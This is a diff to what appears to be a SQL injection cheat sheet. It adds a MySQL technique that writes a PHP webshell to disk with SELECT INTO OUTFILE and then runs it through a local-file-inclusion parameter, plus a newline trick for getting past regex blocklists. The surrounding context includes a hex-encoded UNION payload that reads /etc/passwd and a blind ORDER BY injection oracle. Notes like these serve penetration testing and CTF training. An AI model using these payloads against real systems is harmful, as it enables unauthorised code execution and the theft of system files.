@@ -35,6 +35,12 @@ If `;` or `/` are blocklisted, hex-encode the whole payload — most engines acc
 0x2d3120554e494f4e2053454c454354204e554c4c2c4e554c4c2c222f6574632f706173737764220a   # = -1 UNION SELECT NULL,NULL,"/etc/passwd"
 ```
 
+MySQL/MariaDB SQLi-to-RCE via `SELECT ... INTO OUTFILE`, when the webroot isn't writable by the DB user but another path the web server can read is (e.g. the DB's own data directory):
+```sql
+'; SELECT from_base64('<base64 of a one-line PHP webshell>') INTO OUTFILE '/var/lib/mysql/x.php'; --1
+```
+Confirm the write landed and is web-reachable through whatever read/LFI primitive you already have (e.g. an existing `?page=` parameter), then trigger it: `?page=/var/lib/mysql/x`. A newline (`%0a`) often slips past a naive `preg_match`/regex blocklist that only checks for forbidden keywords on a single line.
+
 Blind SQLi in an `ORDER BY` clause — you can't UNION or subquery there directly, but a `CASE WHEN` expression works as a boolean oracle:
 ```bash
 ?order=(CASE WHEN(<boolean-condition>) THEN <col-A> ELSE <col-B> END)
